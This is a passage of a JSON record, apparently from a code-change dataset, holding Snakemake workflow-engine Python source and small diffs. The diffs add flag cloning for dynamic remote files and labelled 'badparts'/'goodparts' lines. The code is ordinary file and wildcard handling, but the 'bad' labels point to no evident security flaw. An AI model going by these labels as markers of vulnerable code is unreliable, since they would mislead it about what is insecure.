@property\n    def output_mintime(self):\n        \"\"\" Return oldest output file. \"\"\"\n        existing = [f.mtime for f in self.expanded_output if f.exists]\n        if self.benchmark and self.benchmark.exists:\n            existing.append(self.benchmark.mtime)\n        if existing:\n            return min(existing)\n        return None\n\n    @property\n    def input_maxtime(self):\n        \"\"\" Return newest input file. \"\"\"\n        existing = [f.mtime for f in self.input if f.exists]\n        if existing:\n            return max(existing)\n        return None\n\n    def missing_output(self, requested=None):\n        \"\"\" Return missing output files. \"\"\"\n        files = set()\n        if self.benchmark and (requested is None or\n                               self.benchmark in requested):\n            if not self.benchmark.exists:\n                files.add(self.benchmark)\n\n        for f, f_ in zip(self.output, self.rule.output):\n            if requested is None or f in requested:\n                if f in self.dynamic_output:\n                    if not self.expand_dynamic(\n                        f_,\n                        restriction=self.wildcards,\n                        omit_value=_IOFile.dynamic_fill):\n                        files.add(\"{} (dynamic)\".format(f_))\n                elif not f.exists:\n                    files.add(f)\n        return files\n\n    @property\n    def existing_output(self):\n        return filter(lambda f: f.exists, self.expanded_output)\n\n    def check_protected_output(self):\n        protected = list(filter(lambda f: f.protected, self.expanded_output))\n        if protected:\n            raise ProtectedOutputException(self.rule, protected)\n\n    def prepare(self):\n        \"\"\"\n        Prepare execution of job.\n        This includes creation of directories and deletion of previously\n        created dynamic files.\n        \"\"\"\n\n        self.check_protected_output()\n\n        unexpected_output = self.dag.reason(self).missing_output.intersection(\n            self.existing_output)\n        if unexpected_output:\n            logger.warning(\n                \"Warning: the following output files of rule {} were not \"\n                \"present when the DAG was created:\\n{}\".format(\n                    self.rule, unexpected_output))\n\n        if self.dynamic_output:\n            for f, _ in chain(*map(partial(self.expand_dynamic,\n                                           restriction=self.wildcards,\n                                           omit_value=_IOFile.dynamic_fill),\n                                   self.rule.dynamic_output)):\n                os.remove(f)\n        for f, f_ in zip(self.output, self.rule.output):\n            f.prepare()\n        for f in self.log:\n            f.prepare()\n        if self.benchmark:\n            self.benchmark.prepare()\n\n    def cleanup(self):\n        \"\"\" Cleanup output files. \"\"\"\n        to_remove = [f for f in self.expanded_output if f.exists]\n        if to_remove:\n            logger.info(\"Removing output files of failed job {}\"\n                        \" since they might be corrupted:\\n{}\".format(\n                            self, \", \".join(to_remove)))\n            for f in to_remove:\n                f.remove()\n\n    def format_wildcards(self, string, **variables):\n        \"\"\" Format a string with variables from the job. \"\"\"\n        _variables = dict()\n        _variables.update(self.rule.workflow.globals)\n        _variables.update(dict(input=self.input,\n                               output=self.output,\n                               params=self.params,\n                               wildcards=self._format_wildcards,\n                               threads=self.threads,\n                               resources=self.resources,\n                               log=self.log,\n                               version=self.rule.version,\n                               rule=self.rule.name, ))\n        _variables.update(variables)\n        try:\n            return format(string, **_variables)\n        except NameError as ex:\n            raise RuleException(\"NameError: \" + str(ex), rule=self.rule)\n        except IndexError as ex:\n            raise RuleException(\"IndexError: \" + str(ex), rule=self.rule)\n\n    def properties(self, omit_resources=\"_cores _nodes\".split()):\n        resources = {\n            name: res\n            for name, res in self.resources.items()\n            if name not in omit_resources\n        }\n        params = {name: value for name, value in self.params.items()}\n        properties = {\n            \"rule\": self.rule.name,\n            \"local\": self.dag.workflow.is_local(self.rule),\n            \"input\": self.input,\n            \"output\": self.output,\n            \"params\": params,\n            \"threads\": self.threads,\n            \"resources\": resources\n        }\n        return properties\n\n    def json(self):\n        return json.dumps(self.properties())\n\n    def __repr__(self):\n        return self.rule.name\n\n    def __eq__(self, other):\n        if other is None:\n            return False\n        return self.rule == other.rule and (\n            self.dynamic_output or self.wildcards_dict == other.wildcards_dict)\n\n    def __lt__(self, other):\n        return self.rule.__lt__(other.rule)\n\n    def __gt__(self, other):\n        return self.rule.__gt__(other.rule)\n\n    def __hash__(self):\n        return self._hash\n\n    @staticmethod\n    def expand_dynamic(pattern, restriction=None, omit_value=None):\n        \"\"\" Expand dynamic files. \"\"\"\n        return list(listfiles(pattern,\n                              restriction=restriction,\n                              omit_value=omit_value))\n\n\nclass Reason:\n    def __init__(self):\n        self.updated_input = set()\n        self.updated_input_run = set()\n        self.missing_output = set()\n        self.incomplete_output = set()\n        self.forced = False\n        self.noio = False\n        self.nooutput = False\n        self.derived = True\n\n    def __str__(self):\n        s = list()\n        if self.forced:\n            s.append(\"Forced execution\")\n        else:\n            if self.noio:\n                s.append(\"Rules with neither input nor \"\n                         \"output files are always executed.\")\n            elif self.nooutput:\n                s.append(\"Rules with a run or shell declaration but no output \"\n                         \"are always executed.\")\n            else:\n                if self.missing_output:\n                    s.append(\"Missing output files: {}\".format(\n                        \", \".join(self.missing_output)))\n                if self.incomplete_output:\n                    s.append(\"Incomplete output files: {}\".format(\n                        \", \".join(self.incomplete_output)))\n                updated_input = self.updated_input - self.updated_input_run\n                if updated_input:\n                    s.append(\"Updated input files: {}\".format(\n                        \", \".join(updated_input)))\n                if self.updated_input_run:\n                    s.append(\"Input files updated by another job: {}\".format(\n                        \", \".join(self.updated_input_run)))\n        s = \"; \".join(s)\n        return s\n\n    def __bool__(self):\n        return bool(self.updated_input or self.missing_output or self.forced or\n                    self.updated_input_run or self.noio or self.nooutput)\n"}, "/snakemake/remote_providers/__init__.py": {"changes": [{"diff": "-0,", "add": 0, "remove": 0, "filename": "/snakemake/remote_providers/__init__.py", "badparts": ["0,"], "goodparts": []}]}, "/snakemake/rules.py": {"changes": [{"diff": "\n             if f in dynamic_io:\n                 try:\n                     for e in reversed(expand(f, zip, **wildcards)):\n-                        expansion[i].append(IOFile(e, rule=branch))\n+                        # need to clone the flags so intermediate\n+                        # dynamic remote file paths are expanded and \n+                        # removed appropriately\n+                        ioFile = IOFile(e, rule=branch)\n+                        ioFile.clone_flags(f)\n+                        expansion[i].append(ioFile)\n                 except KeyError:\n                     re", "add": 6, "remove": 1, "filename": "/snakemake/rules.py", "badparts": ["                        expansion[i].append(IOFile(e, rule=branch))"], "goodparts": ["                        ioFile = IOFile(e, rule=branch)", "                        ioFile.clone_flags(f)", "                        expansion[i].append(ioFile)"]}], "source": "\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import os import re import sys import inspect import sre_constants from collections import defaultdict from snakemake.io import IOFile, _IOFile, protected, temp, dynamic, Namedlist from snakemake.io import expand, InputFiles, OutputFiles, Wildcards, Params, Log from snakemake.io import apply_wildcards, is_flagged, not_iterable from snakemake.exceptions import RuleException, IOFileException, WildcardError, InputFunctionException class Rule: def __init__(self, *args, lineno=None, snakefile=None): \"\"\" Create a rule Arguments name --the name of the rule \"\"\" if len(args)==2: name, workflow=args self.name=name self.workflow=workflow self.docstring=None self.message=None self._input=InputFiles() self._output=OutputFiles() self._params=Params() self.dependencies=dict() self.dynamic_output=set() self.dynamic_input=set() self.temp_output=set() self.protected_output=set() self.touch_output=set() self.subworkflow_input=dict() self.resources=dict(_cores=1, _nodes=1) self.priority=0 self.version=None self._log=Log() self._benchmark=None self.wildcard_names=set() self.lineno=lineno self.snakefile=snakefile self.run_func=None self.shellcmd=None self.norun=False elif len(args)==1: other=args[0] self.name=other.name self.workflow=other.workflow self.docstring=other.docstring self.message=other.message self._input=InputFiles(other._input) self._output=OutputFiles(other._output) self._params=Params(other._params) self.dependencies=dict(other.dependencies) self.dynamic_output=set(other.dynamic_output) self.dynamic_input=set(other.dynamic_input) self.temp_output=set(other.temp_output) self.protected_output=set(other.protected_output) self.touch_output=set(other.touch_output) self.subworkflow_input=dict(other.subworkflow_input) self.resources=other.resources self.priority=other.priority self.version=other.version self._log=other._log self._benchmark=other._benchmark self.wildcard_names=set(other.wildcard_names) self.lineno=other.lineno self.snakefile=other.snakefile self.run_func=other.run_func self.shellcmd=other.shellcmd self.norun=other.norun def dynamic_branch(self, wildcards, input=True): def get_io(rule): return(rule.input, rule.dynamic_input) if input else( rule.output, rule.dynamic_output ) io, dynamic_io=get_io(self) branch=Rule(self) io_, dynamic_io_=get_io(branch) expansion=defaultdict(list) for i, f in enumerate(io): if f in dynamic_io: try: for e in reversed(expand(f, zip, **wildcards)): expansion[i].append(IOFile(e, rule=branch)) except KeyError: return None replacements=[(i, io[i], e) for i, e in reversed(list(expansion.items()))] for i, old, exp in replacements: dynamic_io_.remove(old) io_.insert_items(i, exp) if not input: for i, old, exp in replacements: if old in branch.temp_output: branch.temp_output.discard(old) branch.temp_output.update(exp) if old in branch.protected_output: branch.protected_output.discard(old) branch.protected_output.update(exp) if old in branch.touch_output: branch.touch_output.discard(old) branch.touch_output.update(exp) branch.wildcard_names.clear() non_dynamic_wildcards=dict((name, values[0]) for name, values in wildcards.items() if len(set(values))==1) (branch._input, branch._output, branch._params, branch._log, branch._benchmark, _, branch.dependencies )=branch.expand_wildcards(wildcards=non_dynamic_wildcards) return branch, non_dynamic_wildcards return branch def has_wildcards(self): \"\"\" Return True if rule contains wildcards. \"\"\" return bool(self.wildcard_names) @property def benchmark(self): return self._benchmark @benchmark.setter def benchmark(self, benchmark): self._benchmark=IOFile(benchmark, rule=self) @property def input(self): return self._input def set_input(self, *input, **kwinput): \"\"\" Add a list of input files. Recursive lists are flattened. Arguments input --the list of input files \"\"\" for item in input: self._set_inoutput_item(item) for name, item in kwinput.items(): self._set_inoutput_item(item, name=name) @property def output(self): return self._output @property def products(self): products=list(self.output) if self.benchmark: products.append(self.benchmark) return products def set_output(self, *output, **kwoutput): \"\"\" Add a list of output files. Recursive lists are flattened. Arguments output --the list of output files \"\"\" for item in output: self._set_inoutput_item(item, output=True) for name, item in kwoutput.items(): self._set_inoutput_item(item, output=True, name=name) for item in self.output: if self.dynamic_output and item not in self.dynamic_output: raise SyntaxError( \"A rule with dynamic output may not define any \" \"non-dynamic output files.\") wildcards=item.get_wildcard_names() if self.wildcard_names: if self.wildcard_names !=wildcards: raise SyntaxError( \"Not all output files of rule{} \" \"contain the same wildcards.\".format(self.name)) else: self.wildcard_names=wildcards def _set_inoutput_item(self, item, output=False, name=None): \"\"\" Set an item to be input or output. Arguments item --the item inoutput --either a Namedlist of input or output items name --an optional name for the item \"\"\" inoutput=self.output if output else self.input if isinstance(item, str): if isinstance(item, _IOFile): self.dependencies[item]=item.rule _item=IOFile(item, rule=self) if is_flagged(item, \"temp\"): if not output: raise SyntaxError(\"Only output files may be temporary\") self.temp_output.add(_item) if is_flagged(item, \"protected\"): if not output: raise SyntaxError(\"Only output files may be protected\") self.protected_output.add(_item) if is_flagged(item, \"touch\"): if not output: raise SyntaxError( \"Only output files may be marked for touching.\") self.touch_output.add(_item) if is_flagged(item, \"dynamic\"): if output: self.dynamic_output.add(_item) else: self.dynamic_input.add(_item) if is_flagged(item, \"subworkflow\"): if output: raise SyntaxError( \"Only input files may refer to a subworkflow\") else: self.subworkflow_input[_item]=item.flags[\"subworkflow\"] inoutput.append(_item) if name: inoutput.add_name(name) elif callable(item): if output: raise SyntaxError( \"Only input files can be specified as functions\") inoutput.append(item) if name: inoutput.add_name(name) else: try: start=len(inoutput) for i in item: self._set_inoutput_item(i, output=output) if name: inoutput.set_name(name, start, end=len(inoutput)) except TypeError: raise SyntaxError( \"Input and output files have to be specified as strings or lists of strings.\") @property def params(self): return self._params def set_params(self, *params, **kwparams): for item in params: self._set_params_item(item) for name, item in kwparams.items(): self._set_params_item(item, name=name) def _set_params_item(self, item, name=None): if isinstance(item, str) or callable(item): self.params.append(item) if name: self.params.add_name(name) else: try: start=len(self.params) for i in item: self._set_params_item(i) if name: self.params.set_name(name, start, end=len(self.params)) except TypeError: raise SyntaxError(\"Params have to be specified as strings.\") @property def log(self): return self._log def set_log(self, *logs, **kwlogs): for item in logs: self._set_log_item(item) for name, item in kwlogs.items(): self._set_log_item(item, name=name) def _set_log_item(self, item, name=None): if isinstance(item, str) or callable(item): self.log.append(IOFile(item, rule=self) if isinstance(item, str) else item) if name: self.log.add_name(name) else: try: start=len(self.log) for i in item: self._set_log_item(i) if name: self.log.set_name(name, start, end=len(self.log)) except TypeError: raise SyntaxError(\"Log files have to be specified as strings.\") def expand_wildcards(self, wildcards=None): \"\"\" Expand wildcards depending on the requested output or given wildcards dict. \"\"\" def concretize_iofile(f, wildcards): if not isinstance(f, _IOFile): return IOFile(f, rule=self) else: return f.apply_wildcards(wildcards, fill_missing=f in self.dynamic_input, fail_dynamic=self.dynamic_output) def _apply_wildcards(newitems, olditems, wildcards, wildcards_obj, concretize=apply_wildcards, ruleio=None): for name, item in olditems.allitems(): start=len(newitems) is_iterable=True if callable(item): try: item=item(wildcards_obj) except(Exception, BaseException) as e: raise InputFunctionException(e, rule=self) if not_iterable(item): item=[item] is_iterable=False for item_ in item: if not isinstance(item_, str): raise RuleException( \"Input function did not return str or list of str.\", rule=self) concrete=concretize(item_, wildcards) newitems.append(concrete) if ruleio is not None: ruleio[concrete]=item_ else: if not_iterable(item): item=[item] is_iterable=False for item_ in item: concrete=concretize(item_, wildcards) newitems.append(concrete) if ruleio is not None: ruleio[concrete]=item_ if name: newitems.set_name( name, start, end=len(newitems) if is_iterable else None) if wildcards is None: wildcards=dict() missing_wildcards=self.wildcard_names -set(wildcards.keys()) if missing_wildcards: raise RuleException( \"Could not resolve wildcards in rule{}:\\n{}\".format( self.name, \"\\n\".join(self.wildcard_names)), lineno=self.lineno, snakefile=self.snakefile) ruleio=dict() try: input=InputFiles() wildcards_obj=Wildcards(fromdict=wildcards) _apply_wildcards(input, self.input, wildcards, wildcards_obj, concretize=concretize_iofile, ruleio=ruleio) params=Params() _apply_wildcards(params, self.params, wildcards, wildcards_obj) output=OutputFiles(o.apply_wildcards(wildcards) for o in self.output) output.take_names(self.output.get_names()) dependencies={ None if f is None else f.apply_wildcards(wildcards): rule for f, rule in self.dependencies.items() } ruleio.update(dict((f, f_) for f, f_ in zip(output, self.output))) log=Log() _apply_wildcards(log, self.log, wildcards, wildcards_obj, concretize=concretize_iofile) benchmark=self.benchmark.apply_wildcards( wildcards) if self.benchmark else None return input, output, params, log, benchmark, ruleio, dependencies except WildcardError as ex: raise RuleException( \"Wildcards in input, params, log or benchmark file of rule{} cannot be \" \"determined from output files:\\n{}\".format(self, str(ex)), lineno=self.lineno, snakefile=self.snakefile) def is_producer(self, requested_output): \"\"\" Returns True if this rule is a producer of the requested output. \"\"\" try: for o in self.products: if o.match(requested_output): return True return False except sre_constants.error as ex: raise IOFileException(\"{} in wildcard statement\".format(ex), snakefile=self.snakefile, lineno=self.lineno) except ValueError as ex: raise IOFileException(\"{}\".format(ex), snakefile=self.snakefile, lineno=self.lineno) def get_wildcards(self, requested_output): \"\"\" Update the given wildcard dictionary by matching regular expression output files to the requested concrete ones. Arguments wildcards --a dictionary of wildcards requested_output --a concrete filepath \"\"\" if requested_output is None: return dict() bestmatchlen=0 bestmatch=None for o in self.products: match=o.match(requested_output) if match: l=self.get_wildcard_len(match.groupdict()) if not bestmatch or bestmatchlen > l: bestmatch=match.groupdict() bestmatchlen=l return bestmatch @staticmethod def get_wildcard_len(wildcards): \"\"\" Return the length of the given wildcard values. Arguments wildcards --a dict of wildcards \"\"\" return sum(map(len, wildcards.values())) def __lt__(self, rule): comp=self.workflow._ruleorder.compare(self, rule) return comp < 0 def __gt__(self, rule): comp=self.workflow._ruleorder.compare(self, rule) return comp > 0 def __str__(self): return self.name def __hash__(self): return self.name.__hash__() def __eq__(self, other): return self.name==other.name class Ruleorder: def __init__(self): self.order=list() def add(self, *rulenames): \"\"\" Records the order of given rules as rule1 > rule2 > rule3,... \"\"\" self.order.append(list(rulenames)) def compare(self, rule1, rule2): \"\"\" Return whether rule2 has a higher priority than rule1. \"\"\" for clause in reversed(self.order): try: i=clause.index(rule1.name) j=clause.index(rule2.name) comp=j -i if comp < 0: comp=-1 elif comp > 0: comp=1 return comp except ValueError: pass wildcard_cmp=rule2.has_wildcards() -rule1.has_wildcards() if wildcard_cmp !=0: return wildcard_cmp return 0 def __iter__(self): return self.order.__iter__() ", "sourceWithComments": "__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport os\nimport re\nimport sys\nimport inspect\nimport sre_constants\nfrom collections import defaultdict\n\nfrom snakemake.io import IOFile, _IOFile, protected, temp, dynamic, Namedlist\nfrom snakemake.io import expand, InputFiles, OutputFiles, Wildcards, Params, Log\nfrom snakemake.io import apply_wildcards, is_flagged, not_iterable\nfrom snakemake.exceptions import RuleException, IOFileException, WildcardError, InputFunctionException\n\n\nclass Rule:\n    def __init__(self, *args, lineno=None, snakefile=None):\n        \"\"\"\n        Create a rule\n\n        Arguments\n        name -- the name of the rule\n        \"\"\"\n        if len(args) == 2:\n            name, workflow = args\n            self.name = name\n            self.workflow = workflow\n            self.docstring = None\n            self.message = None\n            self._input = InputFiles()\n            self._output = OutputFiles()\n            self._params = Params()\n            self.dependencies = dict()\n            self.dynamic_output = set()\n            self.dynamic_input = set()\n            self.temp_output = set()\n            self.protected_output = set()\n            self.touch_output = set()\n            self.subworkflow_input = dict()\n            self.resources = dict(_cores=1, _nodes=1)\n            self.priority = 0\n            self.version = None\n            self._log = Log()\n            self._benchmark = None\n            self.wildcard_names = set()\n            self.lineno = lineno\n            self.snakefile = snakefile\n            self.run_func = None\n            self.shellcmd = None\n            self.norun = False\n        elif len(args) == 1:\n            other = args[0]\n            self.name = other.name\n            self.workflow = other.workflow\n            self.docstring = other.docstring\n            self.message = other.message\n            self._input = InputFiles(other._input)\n            self._output = OutputFiles(other._output)\n            self._params = Params(other._params)\n            self.dependencies = dict(other.dependencies)\n            self.dynamic_output = set(other.dynamic_output)\n            self.dynamic_input = set(other.dynamic_input)\n            self.temp_output = set(other.temp_output)\n            self.protected_output = set(other.protected_output)\n            self.touch_output = set(other.touch_output)\n            self.subworkflow_input = dict(other.subworkflow_input)\n            self.resources = other.resources\n            self.priority = other.priority\n            self.version = other.version\n            self._log = other._log\n            self._benchmark = other._benchmark\n            self.wildcard_names = set(other.wildcard_names)\n            self.lineno = other.lineno\n            self.snakefile = other.snakefile\n            self.run_func = other.run_func\n            self.shellcmd = other.shellcmd\n            self.norun = other.norun\n\n    def dynamic_branch(self, wildcards, input=True):\n        def get_io(rule):\n            return (rule.input, rule.dynamic_input) if input else (\n                rule.output, rule.dynamic_output\n            )\n\n        io, dynamic_io = get_io(self)\n\n        branch = Rule(self)\n        io_, dynamic_io_ = get_io(branch)\n\n        expansion = defaultdict(list)\n        for i, f in enumerate(io):\n            if f in dynamic_io:\n                try:\n                    for e in reversed(expand(f, zip, **wildcards)):\n                        expansion[i].append(IOFile(e, rule=branch))\n                except KeyError:\n                    return None\n\n        # replace the dynamic files with the expanded files\n        replacements = [(i, io[i], e)\n                        for i, e in reversed(list(expansion.items()))]\n        for i, old, exp in replacements:\n            dynamic_io_.remove(old)\n            io_.insert_items(i, exp)\n\n        if not input:\n            for i, old, exp in replacements:\n                if old in branch.temp_output:\n                    branch.temp_output.discard(old)\n                    branch.temp_output.update(exp)\n                if old in branch.protected_output:\n                    branch.protected_output.discard(old)\n                    branch.protected_output.update(exp)\n                if old in branch.touch_output:\n                    branch.touch_output.discard(old)\n                    branch.touch_output.update(exp)\n\n            branch.wildcard_names.clear()\n            non_dynamic_wildcards = dict((name, values[0])\n                                         for name, values in wildcards.items()\n                                         if len(set(values)) == 1)\n            # TODO have a look into how to concretize dependencies here\n            (branch._input, branch._output, branch._params, branch._log,\n             branch._benchmark, _, branch.dependencies\n             ) = branch.expand_wildcards(wildcards=non_dynamic_wildcards)\n            return branch, non_dynamic_wildcards\n        return branch\n\n    def has_wildcards(self):\n        \"\"\"\n        Return True if rule contains wildcards.\n        \"\"\"\n        return bool(self.wildcard_names)\n\n    @property\n    def benchmark(self):\n        return self._benchmark\n\n    @benchmark.setter\n    def benchmark(self, benchmark):\n        self._benchmark = IOFile(benchmark, rule=self)\n\n    @property\n    def input(self):\n        return self._input\n\n    def set_input(self, *input, **kwinput):\n        \"\"\"\n        Add a list of input files. Recursive lists are flattened.\n\n        Arguments\n        input -- the list of input files\n        \"\"\"\n        for item in input:\n            self._set_inoutput_item(item)\n        for name, item in kwinput.items():\n            self._set_inoutput_item(item, name=name)\n\n    @property\n    def output(self):\n        return self._output\n\n    @property\n    def products(self):\n        products = list(self.output)\n        if self.benchmark:\n            products.append(self.benchmark)\n        return products\n\n    def set_output(self, *output, **kwoutput):\n        \"\"\"\n        Add a list of output files. Recursive lists are flattened.\n\n        Arguments\n        output -- the list of output files\n        \"\"\"\n        for item in output:\n            self._set_inoutput_item(item, output=True)\n        for name, item in kwoutput.items():\n            self._set_inoutput_item(item, output=True, name=name)\n\n        for item in self.output:\n            if self.dynamic_output and item not in self.dynamic_output:\n                raise SyntaxError(\n                    \"A rule with dynamic output may not define any \"\n                    \"non-dynamic output files.\")\n            wildcards = item.get_wildcard_names()\n            if self.wildcard_names:\n                if self.wildcard_names != wildcards:\n                    raise SyntaxError(\n                        \"Not all output files of rule {} \"\n                        \"contain the same wildcards.\".format(self.name))\n            else:\n                self.wildcard_names = wildcards\n\n    def _set_inoutput_item(self, item, output=False, name=None):\n        \"\"\"\n        Set an item to be input or output.\n\n        Arguments\n        item     -- the item\n        inoutput -- either a Namedlist of input or output items\n        name     -- an optional name for the item\n        \"\"\"\n        inoutput = self.output if output else self.input\n        if isinstance(item, str):\n            # add the rule to the dependencies\n            if isinstance(item, _IOFile):\n                self.dependencies[item] = item.rule\n            _item = IOFile(item, rule=self)\n            if is_flagged(item, \"temp\"):\n                if not output:\n                    raise SyntaxError(\"Only output files may be temporary\")\n                self.temp_output.add(_item)\n            if is_flagged(item, \"protected\"):\n                if not output:\n                    raise SyntaxError(\"Only output files may be protected\")\n                self.protected_output.add(_item)\n            if is_flagged(item, \"touch\"):\n                if not output:\n                    raise SyntaxError(\n                        \"Only output files may be marked for touching.\")\n                self.touch_output.add(_item)\n            if is_flagged(item, \"dynamic\"):\n                if output:\n                    self.dynamic_output.add(_item)\n                else:\n                    self.dynamic_input.add(_item)\n            if is_flagged(item, \"subworkflow\"):\n                if output:\n                    raise SyntaxError(\n                        \"Only input files may refer to a subworkflow\")\n                else:\n                    # record the workflow this item comes from\n                    self.subworkflow_input[_item] = item.flags[\"subworkflow\"]\n            inoutput.append(_item)\n            if name:\n                inoutput.add_name(name)\n        elif callable(item):\n            if output:\n                raise SyntaxError(\n                    \"Only input files can be specified as functions\")\n            inoutput.append(item)\n            if name:\n                inoutput.add_name(name)\n        else:\n            try:\n                start = len(inoutput)\n                for i in item:\n                    self._set_inoutput_item(i, output=output)\n                if name:\n                    # if the list was named, make it accessible\n                    inoutput.set_name(name, start, end=len(inoutput))\n            except TypeError:\n                raise SyntaxError(\n                    \"Input and output files have to be specified as strings or lists of strings.\")\n\n    @property\n    def params(self):\n        return self._params\n\n    def set_params(self, *params, **kwparams):\n        for item in params:\n            self._set_params_item(item)\n        for name, item in kwparams.items():\n            self._set_params_item(item, name=name)\n\n    def _set_params_item(self, item, name=None):\n        if isinstance(item, str) or callable(item):\n            self.params.append(item)\n            if name:\n                self.params.add_name(name)\n        else:\n            try:\n                start = len(self.params)\n                for i in item:\n                    self._set_params_item(i)\n                if name:\n                    self.params.set_name(name, start, end=len(self.params))\n            except TypeError:\n                raise SyntaxError(\"Params have to be specified as strings.\")\n\n    @property\n    def log(self):\n        return self._log\n\n    def set_log(self, *logs, **kwlogs):\n        for item in logs:\n            self._set_log_item(item)\n        for name, item in kwlogs.items():\n            self._set_log_item(item, name=name)\n\n    def _set_log_item(self, item, name=None):\n        if isinstance(item, str) or callable(item):\n            self.log.append(IOFile(item,\n                                   rule=self)\n                            if isinstance(item, str) else item)\n            if name:\n                self.log.add_name(name)\n        else:\n            try:\n                start = len(self.log)\n                for i in item:\n                    self._set_log_item(i)\n                if name:\n                    self.log.set_name(name, start, end=len(self.log))\n            except TypeError:\n                raise SyntaxError(\"Log files have to be specified as strings.\")\n\n    def expand_wildcards(self, wildcards=None):\n        \"\"\"\n        Expand wildcards depending on the requested output\n        or given wildcards dict.\n        \"\"\"\n\n        def concretize_iofile(f, wildcards):\n            if not isinstance(f, _IOFile):\n                return IOFile(f, rule=self)\n            else:\n                return f.apply_wildcards(wildcards,\n                                         fill_missing=f in self.dynamic_input,\n                                         fail_dynamic=self.dynamic_output)\n\n        def _apply_wildcards(newitems, olditems, wildcards, wildcards_obj,\n                             concretize=apply_wildcards,\n                             ruleio=None):\n            for name, item in olditems.allitems():\n                start = len(newitems)\n                is_iterable = True\n                if callable(item):\n                    try:\n                        item = item(wildcards_obj)\n                    except (Exception, BaseException) as e:\n                        raise InputFunctionException(e, rule=self)\n                    if not_iterable(item):\n                        item = [item]\n                        is_iterable = False\n                    for item_ in item:\n                        if not isinstance(item_, str):\n                            raise RuleException(\n                                \"Input function did not return str or list of str.\",\n                                rule=self)\n                        concrete = concretize(item_, wildcards)\n                        newitems.append(concrete)\n                        if ruleio is not None:\n                            ruleio[concrete] = item_\n                else:\n                    if not_iterable(item):\n                        item = [item]\n                        is_iterable = False\n                    for item_ in item:\n                        concrete = concretize(item_, wildcards)\n                        newitems.append(concrete)\n                        if ruleio is not None:\n                            ruleio[concrete] = item_\n                if name:\n                    newitems.set_name(\n                        name, start,\n                        end=len(newitems) if is_iterable else None)\n\n        if wildcards is None:\n            wildcards = dict()\n        missing_wildcards = self.wildcard_names - set(wildcards.keys())\n\n        if missing_wildcards:\n            raise RuleException(\n                \"Could not resolve wildcards in rule {}:\\n{}\".format(\n                    self.name, \"\\n\".join(self.wildcard_names)),\n                lineno=self.lineno,\n                snakefile=self.snakefile)\n\n        ruleio = dict()\n\n        try:\n            input = InputFiles()\n            wildcards_obj = Wildcards(fromdict=wildcards)\n            _apply_wildcards(input, self.input, wildcards, wildcards_obj,\n                             concretize=concretize_iofile,\n                             ruleio=ruleio)\n\n            params = Params()\n            _apply_wildcards(params, self.params, wildcards, wildcards_obj)\n\n            output = OutputFiles(o.apply_wildcards(wildcards)\n                                 for o in self.output)\n            output.take_names(self.output.get_names())\n\n            dependencies = {\n                None if f is None else f.apply_wildcards(wildcards): rule\n                for f, rule in self.dependencies.items()\n            }\n\n            ruleio.update(dict((f, f_) for f, f_ in zip(output, self.output)))\n\n            log = Log()\n            _apply_wildcards(log, self.log, wildcards, wildcards_obj,\n                             concretize=concretize_iofile)\n\n            benchmark = self.benchmark.apply_wildcards(\n                wildcards) if self.benchmark else None\n            return input, output, params, log, benchmark, ruleio, dependencies\n        except WildcardError as ex:\n            # this can only happen if an input contains an unresolved wildcard.\n            raise RuleException(\n                \"Wildcards in input, params, log or benchmark file of rule {} cannot be \"\n                \"determined from output files:\\n{}\".format(self, str(ex)),\n                lineno=self.lineno,\n                snakefile=self.snakefile)\n\n    def is_producer(self, requested_output):\n        \"\"\"\n        Returns True if this rule is a producer of the requested output.\n        \"\"\"\n        try:\n            for o in self.products:\n                if o.match(requested_output):\n                    return True\n            return False\n        except sre_constants.error as ex:\n            raise IOFileException(\"{} in wildcard statement\".format(ex),\n                                  snakefile=self.snakefile,\n                                  lineno=self.lineno)\n        except ValueError as ex:\n            raise IOFileException(\"{}\".format(ex),\n                                  snakefile=self.snakefile,\n                                  lineno=self.lineno)\n\n    def get_wildcards(self, requested_output):\n        \"\"\"\n        Update the given wildcard dictionary by matching regular expression\n        output files to the requested concrete ones.\n\n        Arguments\n        wildcards -- a dictionary of wildcards\n        requested_output -- a concrete filepath\n        \"\"\"\n        if requested_output is None:\n            return dict()\n        bestmatchlen = 0\n        bestmatch = None\n\n        for o in self.products:\n            match = o.match(requested_output)\n            if match:\n                l = self.get_wildcard_len(match.groupdict())\n                if not bestmatch or bestmatchlen > l:\n                    bestmatch = match.groupdict()\n                    bestmatchlen = l\n        return bestmatch\n\n    @staticmethod\n    def get_wildcard_len(wildcards):\n        \"\"\"\n        Return the length of the given wildcard values.\n\n        Arguments\n        wildcards -- a dict of wildcards\n        \"\"\"\n        return sum(map(len, wildcards.values()))\n\n    def __lt__(self, rule):\n        comp = self.workflow._ruleorder.compare(self, rule)\n        return comp < 0\n\n    def __gt__(self, rule):\n        comp = self.workflow._ruleorder.compare(self, rule)\n        return comp > 0\n\n    def __str__(self):\n        return self.name\n\n    def __hash__(self):\n        return self.name.__hash__()\n\n    def __eq__(self, other):\n        return self.name == other.name\n\n\nclass Ruleorder:\n    def __init__(self):\n        self.order = list()\n\n    def add(self, *rulenames):\n        \"\"\"\n        Records the order of given rules as rule1 > rule2 > rule3, ...\n        \"\"\"\n        self.order.append(list(rulenames))\n\n    def compare(self, rule1, rule2):\n        \"\"\"\n        Return whether rule2 has a higher priority than rule1.\n        \"\"\"\n        # try the last clause first,\n        # i.e. clauses added later overwrite those before.\n        for clause in reversed(self.order):\n            try:\n                i = clause.index(rule1.name)\n                j = clause.index(rule2.name)\n                # rules with higher priority should have a smaller index\n                comp = j - i\n                if comp < 0:\n                    comp = -1\n                elif comp > 0:\n                    comp = 1\n                return comp\n            except ValueError:\n                pass\n\n        # if not ruleorder given, prefer rule without wildcards\n        wildcard_cmp = rule2.has_wildcards() - rule1.has_wildcards()\n        if wildcard_cmp != 0:\n            return wildcard_cmp\n\n        return 0\n\n    def __iter__(self):\n        return self.order.__iter__()\n"}, "/snakemake/workflow.py": {"changes": [{"diff": "\n from snakemake.scheduler import JobScheduler\n from snakemake.parser import parse\n import snakemake.io\n-from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch\n+from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch\n from snakemake.persistence import Persistence\n from snakemake.utils import upd", "add": 1, "remove": 1, "filename": "/snakemake/workflow.py", 